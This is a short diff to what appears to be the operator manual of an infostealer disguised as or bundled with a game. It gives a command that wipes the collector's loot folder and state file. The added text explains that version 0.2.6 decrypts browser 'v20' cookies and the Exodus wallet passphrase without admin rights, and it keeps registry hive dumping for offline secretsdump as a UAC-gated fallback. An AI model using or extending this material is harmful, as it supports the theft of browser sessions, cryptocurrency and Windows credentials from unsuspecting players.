@@ -36,7 +36,11 @@ shell rmdir /s /q "%LOCALAPPDATA%\ServerPackCore\loot" 2>nul & del "%LOCALAPPDAT
 `state.json` holds `bootstrap`; deleting it re-arms the collector. The agent has
 to be restarted for that (`kill`, or close the game).
 
-## 1. Hives (only if UAC was declined)
+## 1. Hives (optional from 0.2.6)
+
+0.2.6 already unwraps v20 cookies and the Exodus machine passphrase in the
+user session, so no administrator password is needed for them. `hives` remains
+for offline `secretsdump` and as a fallback; it needs UAC once.
 
 The manual way first — but if you have no shell access to type it, `hives`
 re-runs the step on its own:
